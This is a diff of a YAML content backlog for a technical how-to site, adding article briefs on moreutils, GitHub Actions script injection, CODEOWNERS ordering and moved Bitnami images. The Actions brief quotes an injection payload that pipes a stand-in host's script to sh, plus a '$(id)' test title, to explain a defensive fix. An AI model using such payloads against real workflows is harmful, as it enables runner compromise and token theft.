@@ -2237,7 +2237,8 @@ backlog:
     brief: "Wrap any command that fails for dumb transient reasons — a flaky curl, a container that isn't ready yet — in a reusable shell `retry()` that loops up to N times and doubles the sleep each round (1s, 2s, 4s). Offline-testable: point it at a command scripted to fail twice then succeed and watch it recover. Two failures stay in: retrying a command that fails for a REAL reason (bad auth, a 404, a typo) just burns the whole budget slowly before failing anyway — cap the attempts and don't retry the un-retryable — and a fleet of machines that all failed on the same tick will all retry on the same tick and stampede the thing that's already down, so add random jitter to the backoff, not a fixed sleep."
     voice: how-to-practical
     priority: P3
-    status: todo
+    status: done
+    published: /hacks/retry-function-backoff-jitter/
     source: content-scout
     source_url: https://it-journey.dev/quests/1001/agentic-safe-execution-and-error-handling/
     source_title: "The Shield of Retries: Safe Execution and Error Handling"
@@ -5194,6 +5195,7 @@ backlog:
     source_url: https://it-journey.dev/quests/0000/os-selection/
     source_title: "OS Selection: Choose Your Realm of Power"
     fingerprint: 3e1de83e217b
+
   - id: DOC-054
     kind: doc
     author: edge
@@ -5203,3 +5205,48 @@ backlog:
     priority: P2
     status: done
     published: /docs/the-explorer-that-files-one-bug-twelve-times/
+  - id: TOOL-036
+    kind: tool
+    title: "moreutils: the toolbox whose sponge soaks up an empty pipe and saves it anyway"
+    brief: "Threat-modeled honest review of Joey Hess's moreutils (sponge, ifne, chronic, ts, mispipe, vidir, errno). sponge fixes the `cmd file > file` truncation, then happily writes a zero-byte result when the pipeline matched nothing (pipefail can't stop it). Strace shows two write paths: same filesystem = temp file in /tmp + rename (new inode, so a hard link keeps the OLD secret); cross-filesystem = truncate-and-copy in place (non-atomic). vidir deletes a file when you delete its line. chronic hides stderr warnings unless -e. The package's parallel is diverted aside by GNU parallel. Three ranked, tested mitigations."
+    voice: threat-model-everything
+    priority: P2
+    status: done
+    published: /tools/moreutils-honest-review/
+
+  # --- content-scout topic ideas (auto-appended; humans may edit/reprioritize) ---
+  # Each carries the source it-journey.dev page it was inspired by; grow-lifehacker
+  # links that page in the published piece. Default P3 — human items outrank these.
+  - id: SRC-163
+    kind: hack
+    title: "GitHub Actions script injection: ${{ github.event.issue.body }} inside run: lets a stranger type into your runner's shell"
+    brief: "SEVERITY: every secret the job can see. ATTACK VECTOR: an issue titled like a shell command. Actions substitutes `${{ … }}` into the script TEXT before bash ever starts, so a workflow that does `echo \"${{ github.event.issue.body }}\" > anchor.txt` hands anyone who can open an issue a line of your shell: a body containing `\"; curl https://evil.example/x | sh; echo \"` runs on a runner holding your `GITHUB_TOKEN`. The three mitigations that actually matter, ranked: (1) never interpolate untrusted event fields into `run:`. Map them through `env:` (`env: BODY: ${{ github.event.issue.body }}`) and use `\"$BODY\"`, so the shell sees a variable, not code; (2) give the job a `permissions:` block with only what it needs, so a successful injection steals a token that can't push; (3) lint every workflow with `actionlint` or `zizmor`, which both flag this pattern, so the next copy-paste gets caught in review. The failures that stay in: wrapping the expression in quotes does NOT help, because substitution happens before quoting exists; and building JSON from that body with `echo '{\"intent\": \"'\"$BODY\"'\"}'` breaks on the first apostrophe even after you fix the injection, so use `jq -n --arg intent \"$BODY\" '{intent: $intent}'`. Reproducible in a throwaway repo with one issue whose title is `$(id)`."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quests/1010/agentic-state-persistence-and-drift/
+    source_title: "Agentic State Persistence and Drift (Quest 1010)"
+    fingerprint: 175154c1651a
+  - id: SRC-164
+    kind: hack
+    title: "CODEOWNERS is last-match-wins: the catch-all at the bottom just un-owned your security rule"
+    brief: "You write `/.github/workflows/ @org/security` near the top of CODEOWNERS, add a tidy `* @org/maintainers` catch-all at the bottom 'so nothing is unowned', and from then on workflow changes need only a maintainer's approval. GitHub evaluates CODEOWNERS so that the LAST matching pattern wins outright, and rules never combine, so the catch-all overrides every specific rule above it. The fix is ordering: catch-all FIRST, specific paths after, most specific last. The failures that stay in: a later matching line with NO owners deliberately un-owns the path, so a stray `/docs/` with nothing after it silently exempts a directory; an owner without write access, or a misspelled team, is skipped with no error in the PR, so check `gh api repos/OWNER/REPO/codeowners/errors` (or the warning banner on the file's page) after every edit; and CODEOWNERS only requests reviewers. It blocks nothing until branch protection turns on 'Require review from Code Owners', which this very site once found switched off. You'll know it worked when a test PR touching `.github/workflows/` requests the security team and only the security team."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quest-reports/2026-07-20-data-scientist-1100/
+    source_title: "Quest Report: Data Scientist Level 1100"
+    fingerprint: c363d2f92c84
+  - id: SRC-165
+    kind: hack
+    title: "Your tutorial's docker compose died overnight with 'manifest unknown': the Bitnami image that moved, and why bitnamilegacy is a tourniquet, not a fix"
+    brief: "Last week's tutorial worked. Today `docker compose up` stops at `manifest unknown` for `bitnami/kafka:3.7`, because the tag you pinned no longer exists where you pinned it. Bitnami's free catalog change moved most versioned tags off `docker.io/bitnami` into an archive repo (writer: verify the current state and dates against Bitnami's own announcement before publishing). Check before you trust a compose file: `docker manifest inspect bitnami/kafka:3.7 >/dev/null && echo ok`. The real fixes, ranked: move to the upstream project's official image (`apache/kafka`, `postgres`, `redis`); or, if you need the bytes to exist forever, pull once and push them to a registry you control. The failures that stay in: swapping in the `bitnamilegacy/` tag makes the error go away and freezes you on an image that gets no security updates; Bitnami images take their own env vars (`KAFKA_CFG_*`, `ALLOW_PLAINTEXT_LISTENER`) that upstream images ignore, so changing the image line is a config migration, not a rename; and pinning by `@sha256` digest does NOT save you here, because a digest guards against a tag that MOVES, not a registry that DELETES. You'll know it worked when `docker compose pull` finishes with no `manifest unknown`."
+    voice: how-to-practical
+    priority: P3
+    status: todo
+    source: content-scout
+    source_url: https://it-journey.dev/quest-reports/2026-07-20-data-scientist-1100/
+    source_title: "Quest Report: Data Scientist Level 1100"
+    fingerprint: c4c8e163c363
